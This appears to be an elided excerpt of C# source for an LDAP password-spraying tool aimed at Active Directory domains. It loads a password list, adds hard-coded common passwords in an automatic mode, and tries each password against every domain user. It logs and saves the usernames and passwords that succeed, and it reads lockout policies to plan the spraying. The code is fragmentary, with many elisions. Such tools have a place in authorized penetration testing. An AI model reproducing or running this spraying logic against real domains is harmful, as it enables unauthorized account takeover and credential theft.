...
namespace SharpHose.Nozzles.LDAP
{
    public class LDAPNozzle : Nozzle
    {
        ...
        public override void Start()
        {
            ...
            var passwd = new List<string>();

            // add password into list
            try
            {

                if (!string.IsNullOrEmpty(Config.PasswdFilePath))
                {
                    passwd = File.ReadAllLines(Config.PasswdFilePath).ToList();
                }

                if (Config.Auto)
                {
                    string[] passwdList = { "1234qwer!@#$", "1qaz@WSX1qaz", "QAZwsxEDC" };
                    foreach (var pass in passwdList)
                    {
                        passwd.Add(pass);
                ...
                if (!string.IsNullOrEmpty(Config.SprayPassword))
                    passwd.Add(Config.SprayPassword);
                ...
                foreach (var user in Users)
                {
                    ...
                    {
                        foreach (var pass in passwd)
                        {
                            if (TryCredentialsAsync(user.Username, pass).Result)
                            {
                                _logger.Log($"SUCCESS: {user.Username} / {pass}");

                                if (Config.SaveOutput)
                                {
                                    contents += $"{user.Username},{pass}\n";
                                }
                                found += 1;
                            }
                            sprayed += 1;
            ...
            {
                _logger.Log("spray have something error");
        ...
        public int DisplayPolicyUsers(string policyName, bool onlyCount = false)
        {
            ...
            {
                _logger.Log("DisplayPolicyUsers have something error");
                _logger.Log($"[-] Exception: {ex}");
        ...
        private void DisplayPolicyDetails(LDAPPasswordPolicy policy)
        {
            ...
            if (Config.SaveOutput)
            {
                ...
                contents += $"Lockout Threshold(count lock times:0 is naver lock): {policy.LockoutThreshold}\n";
        ...
        private void LoadDomainContext()
        {
            ...
            try
            {
                if ((!string.IsNullOrEmpty(Config.DomainUsername)) && (!string.IsNullOrEmpty(Config.DomainPassword)))
                {
                    ...
                    {
                        if (!string.IsNullOrEmpty(Config.DomainIp))
                        {
                            Config.DomainController = Config.DomainName;
                        }
                        else
                        {
                    ...
                    if (!string.IsNullOrEmpty(Config.DomainController))
                    {
                        ...
                        if (!string.IsNullOrEmpty(Config.DomainIp)){
                            DirectoryEntry = new DirectoryEntry($"LDAP://{Config.DomainIp}");
                        }
                        else
                        {
                            DirectoryEntry = new DirectoryEntry($"LDAP://{Config.DomainController}");
                        }
                        DirectoryEntry.Username = Config.DomainName+"\\"+Config.DomainUsername;
                        DirectoryEntry.Password = Config.DomainPassword;
                ...
                else
                {
                    if (ContextHelper.IsInDomain())
                    {
                        ...
                        _logger.Log($"[-] Retrieved domain and controller: {Config.DomainName}");
            ...
            {
                _logger.Log("LDAP service error!");
                _logger.Log($"[-] Exception: {ex}");
        ...
        private void GetPasswordPolicies()
        {
            ...
            {
                _logger.Log("GetPasswordPolicies have something error");
                _logger.Log($"[-] Exception: {ex}");
